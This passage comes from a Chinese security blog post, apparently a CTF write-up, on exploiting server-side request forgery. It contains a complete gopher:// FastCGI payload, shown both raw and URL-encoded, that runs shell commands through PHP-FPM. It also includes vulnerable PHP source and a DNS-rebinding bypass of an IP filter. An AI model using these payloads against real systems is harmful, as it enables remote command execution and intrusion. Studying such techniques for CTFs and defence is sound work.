+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH56%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%008%04%00%3C%3Fphp%20system%28%27ls%20/%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure>
+<p><img src="http://qiniuyun.lintstar.top/20200805120901.png" alt="20200805120901"></p>
+<p>因为是GET形式会自动解码一次所以要去url编码得到:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%67%6f%70%68%65%72%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%39%30%30%30%2f%5f%25%30%31%25%30%31%25%30%30%25%30%31%25%30%30%25%30%38%25%30%30%25%30%30%25%30%30%25%30%31%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%31%25%30%34%25%30%30%25%30%31%25%30%31%25%30%34%25%30%34%25%30%30%25%30%46%25%31%30%53%45%52%56%45%52%5f%53%4f%46%54%57%41%52%45%67%6f%25%32%30%2f%25%32%30%66%63%67%69%63%6c%69%65%6e%74%25%32%30%25%30%42%25%30%39%52%45%4d%4f%54%45%5f%41%44%44%52%31%32%37%2e%30%2e%30%2e%31%25%30%46%25%30%38%53%45%52%56%45%52%5f%50%52%4f%54%4f%43%4f%4c%48%54%54%50%2f%31%2e%31%25%30%45%25%30%32%43%4f%4e%54%45%4e%54%5f%4c%45%4e%47%54%48%35%36%25%30%45%25%30%34%52%45%51%55%45%53%54%5f%4d%45%54%48%4f%44%50%4f%53%54%25%30%39%4b%50%48%50%5f%56%41%4c%55%45%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%25%32%30%25%33%44%25%32%30%4f%6e%25%30%41%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%25%32%30%25%33%44%25%32%30%25%30%41%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%25%32%30%25%33%44%25%32%30%70%68%70%25%33%41%2f%2f%69%6e%70%75%74%25%30%46%25%31%37%53%43%52%49%50%54%5f%46%49%4c%45%4e%41%4d%45%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%69%6e%64%65%78%2e%70%68%70%25%30%44%25%30%31%44%4f%43%55%4d%45%4e%54%5f%52%4f%4f%54%2f%25%30%30%25%30%30%25%30%30%25%30%30%25%30%31%25%30%34%25%30%30%25%30%31%25%30%30%25%30%30%25%30%30%25%30%30%25%30%31%25%30%35%25%30%30%25%30%31%25%30%30%38%25%30%34%25%30%30%25%33%43%25%33%46%70%68%70%25%32%30%73%79%73%74%65%6d%25%32%38%25%32%37%6c%73%25%32%30%2f%25%32%37%25%32%39%25%33%42%64%69%65%25%32%38%25%32%37%2d%2d%2d%2d%2d%4d%61%64%65%2d%62%79%2d%53%70%79%44%33%72%2d%2d%2d%2d%2d%25%30%41%25%32%37%25%32%39%25%33%42%25%33%46%25%33%45%25%30%30%25%30%30%25%30%30%25%30%30</span><br></pre></td></tr></table></figure>
+<p><img src="http://qiniuyun.lintstar.top/20200805120707.png" alt="20200805120707"></p>
+<p>上传payload:</p>
+<p><img src="http://qiniuyun.lintstar.top/20200805120728.png" alt="20200805120728"></p>
+<p>发现执行了<code>ls /</code>命令，根目录下有ffffffffffllllllllaaagggggg文件</p>
+<p>重新生成<code>cat /ffffffffffllllllllaaagggggg</code>命令的payload并再次URL编码：</p>
+<p><img src="http://qiniuyun.lintstar.top/20200805122012.png" alt="20200805122012"></p>
+<p>上传payload得到flag:</p>
+<p><img src="http://qiniuyun.lintstar.top/20200805122051.png" alt="20200805122051"></p>
+<p>类似题目：<a href="https://www.cnblogs.com/zaqzzz/p/11975948.html" target="_blank" rel="noopener">https://www.cnblogs.com/zaqzzz/p/11975948.html</a></p>
+<h2 id="DNS重定向"><a href="#DNS重定向" class="headerlink" title="DNS重定向"></a>DNS重定向</h2><p><a href="http://das.wetolink.com:45080/" target="_blank" rel="noopener">http://das.wetolink.com:45080/</a> 拿到 flag  提示：DNS 重绑定 ceye.io</p>
+<p><img src="http://qiniuyun.lintstar.top/image-20200809204710025.png" alt="image-20200809204710025"></p>
+<p>分析代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// /flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">    $result = parse_url($_GET[<span class="string">'url'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($result[<span class="string">'scheme'</span>] !== <span class="string">'http'</span> &amp;&amp; $result[<span class="string">'scheme'</span>] !== <span class="string">'https'</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'scheme!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ip = gethostbyname($result[<span class="string">'host'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'ip!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($ip === <span class="string">"127.0.0.1"</span> || $ip === <span class="string">"0.0.0.0"</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'ip!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($_GET[<span class="string">'url'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>获取 url 参数，进行解析，解析之后判断协议是否为 http 和 https，再继续获取域名中的host 进行解析，判断解析之后的 ip 是否不为内网 ip，不为内网 ip 再继续往下利用 file_get_contents 发出请求。此处存在有限制的 SSRF 点。</p>
+</blockquote>
+<p>看到开头有 flag.php，则我们可以尝试访问，告诉我们需要从 127.0.0.1 也就是本地访问才行。</p>
+<p><img src="http://qiniuyun.lintstar.top/20200810215909.png" alt="20200810215909"></p>
+<p>所以要想办法通过前面的 SSRF 点访问到 127.0.0.1 的<code>/flag.php</code> 才能获得flag。有解析判断ip，那如何绕过呢？就可以用到之前学习的 DNS 重绑定了，让其第一次返回内网地址之外的地址，正式请求时再次解析再解析到127.0.0.1，即可请求道 127.0.0.1 的 <code>/flag.php</code>。</p>
+<p>这里使用 ceye.io 的 DNS 重绑定域名来完成。打开 ceye.io，看到 profile，设置 DNS rebinding。</p>
+<p><img src="http://qiniuyun.lintstar.top/20200810220258.png" alt="20200810220258"></p>
+<p>记录下自己的域名，比如 <code>qcqi7p.ceye.io</code>，则 dns rebinding 的域名就是 <code>r.qcqi7p.ceye.io</code>。</p>
+<p>发出请求进行尝试: <code>http://das.wetolink.com:45080/?url=http://r.qcqi7p.ceye.io/flag.php</code>有时要多试几次，因为 DNS rebinding 是随机返回的，要拼一下运气。多试几次即可拿到 flag。</p>
+<p><img src="http://qiniuyun.lintstar.top/20200810220659.png" alt="20200810220659"></p>
+<h1 id="Dns-Rebinding的使用"><a href="#Dns-Rebinding的使用" class="headerlink" title="Dns Rebinding的使用"></a>Dns Rebinding的使用</h1><p><strong><a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a></strong></p>
+<p><strong>基本原理为目标 SSRF 点需要先验证输入的 url 里的 host 解析是否不为某些地址（例如内网地址），不为这些地址则继续请求，但之后正式请求时会重新解析一遍，这次解析到的就是另外一个地址，导致最终请求到的就是另外一个地址。</strong></p>
+<p>例：有一个域名，开了 dns rebinding 功能，设置返回 223.5.5.5 和 127.0.0.1</p>
+<ul>
+<li><p>验证时解析该域名返回 223.5.5.5，通过。</p>
+</li>
+<li><p>正式请求时该域名解析返回的则是 127.0.0.1。</p>
+</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    离沫凌天๓
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://winthorlimo.github.io/note/2020/undefined08/ce4db0e6.html" title="SSRF服务端请求伪造攻击">https://winthorlimo.github.io/note/2020/undefined08/ce4db0e6.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/note/2020/undefined07/ecd34c17.html" rel="next" title="CSRF跨站请求伪造攻击">
+                <i class="fa fa-chevron-left"></i> CSRF跨站请求伪造攻击
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/note/2020/undefined09/68937ff4.html" rel="prev" title="PHP代码执行漏洞">
+                PHP代码执行漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="离沫凌天๓">
+            
+              <p class="site-author-name" itemprop="name">离沫凌天๓</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF服务端请求伪造攻击"><span class="nav-number">1.</span> <span class="nav-text">SSRF服务端请求伪造攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是SSRF"><span class="nav-number">1.1.</span> <span class="nav-text">什么是SSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF漏洞可以做什么"><span class="nav-number">1.2.</span> <span class="nav-text">SSRF漏洞可以做什么</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF漏洞探测"><span class="nav-number">2.</span> <span class="nav-text">SSRF漏洞探测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">SSRF漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF有关的函数"><span class="nav-number">3.1.</span> <span class="nav-text">SSRF有关的函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF常见利用–file-协议"><span class="nav-number">3.2.</span> <span class="nav-text">SSRF常见利用–file://协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF常见利用–dict-协议"><span class="nav-number">3.3.</span> <span class="nav-text">SSRF常见利用–dict://协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF常见利用–Gopher-协议"><span class="nav-number">3.4.</span> <span class="nav-text">SSRF常见利用–Gopher://协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF-REDIS写入WEBSHEEL"><span class="nav-number">3.5.</span> <span class="nav-text">SSRF+REDIS写入WEBSHEEL</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#自动化神奇利用生成payload"><span class="nav-number">3.5.1.</span> <span class="nav-text">自动化神奇利用生成payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF常见利用-urllib头注入"><span class="nav-number">3.6.</span> <span class="nav-text">SSRF常见利用-urllib头注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF常见利用-30x跳转"><span class="nav-number">3.7.</span> <span class="nav-text">SSRF常见利用-30x跳转</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF漏洞绕过"><span class="nav-number">4.</span> <span class="nav-text">SSRF漏洞绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF常见绕过-短地址"><span class="nav-number">4.1.</span> <span class="nav-text">SSRF常见绕过-短地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF常见绕过-xip-io"><span class="nav-number">4.2.</span> <span class="nav-text">SSRF常见绕过 -xip.io</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF常见绕过-IP格式绕过"><span class="nav-number">4.3.</span> <span class="nav-text">SSRF常见绕过-IP格式绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF常见绕过-协议绕过"><span class="nav-number">4.4.</span> <span class="nav-text">SSRF常见绕过-协议绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF进阶利用-log"><span class="nav-number">4.5.</span> <span class="nav-text">SSRF进阶利用-log</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Dnslog"><span class="nav-number">4.5.1.</span> <span class="nav-text">Dnslog</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#httplog"><span class="nav-number">4.5.2.</span> <span class="nav-text">httplog</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF进阶利用-time"><span class="nav-number">4.6.</span> <span class="nav-text">SSRF进阶利用-time</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF进阶利用-dns-rebinding"><span class="nav-number">4.7.</span> <span class="nav-text">SSRF进阶利用-dns rebinding</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#差异化导致的问题"><span class="nav-number">4.8.</span> <span class="nav-text">差异化导致的问题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF实战"><span class="nav-number">5.</span> <span class="nav-text">SSRF实战</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#探测内网"><span class="nav-number">5.1.</span> <span class="nav-text">探测内网</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gopherus-–exploit-redis"><span class="nav-number">5.2.</span> <span class="nav-text">gopherus –exploit redis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gopherus-–exploit-fastcgi"><span class="nav-number">5.3.</span> <span class="nav-text">gopherus –exploit fastcgi</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS重定向"><span class="nav-number">5.4.</span> <span class="nav-text">DNS重定向</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Dns-Rebinding的使用"><span class="nav-number">6.</span> <span class="nav-text">Dns Rebinding的使用</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">离沫凌天๓</span>
+
+  
+</div>
+
+<!--
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+-->
+
+<div class="busuanzi-count">
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+    来访人数：<span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 
+    </span>
+    <div class="powered-by"></div>
+    <span class="site-uv">
+      <i class="fa fa-eye"></i>
+    访问次数：<span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+    <!-- 博客字数统计 -->
+    <span class="site-pv">
+      <i class="fa fa-pencil"></i>
+    全站字数：<span class="post-count">115.8k</span>
+    </span>
+</div>
+
+
+
+
+
+<div class="BbeiAn-info">
+   	<!--津ICP备  -->
+    <a target="_blank" href="http://www.beian.miit.gov.cn/" style="color:#f0d784" rel="nofollow">津ICP备18005284</a> <!--a标签中增加nofollow属性，避免爬虫出站。-->| 
+	<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12011102000578" style="color:#f0d784;text-decoration:none;padding-left:30px;background:url(https://s1.ax1x.com/2018/09/29/ilmwIH.png) no-repeat left center" rel="nofollow">津公网安备12011102000578号</a>	  <!--这里将图标作为了背景，以使得能和后面的文字在同一行-->
+</div>
+
+<!--
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+-->
+
+
+
+<!-- 在网页底部添加网站运行时间 -->
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("05/21/2019 00:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "Run for "+dnum+" Days ";
+        document.getElementById("times").innerHTML = hnum + " Hours " + mnum + " m " + snum + " s";
+    }
+setInterval("createtime()",250);
+</script>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_lines.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
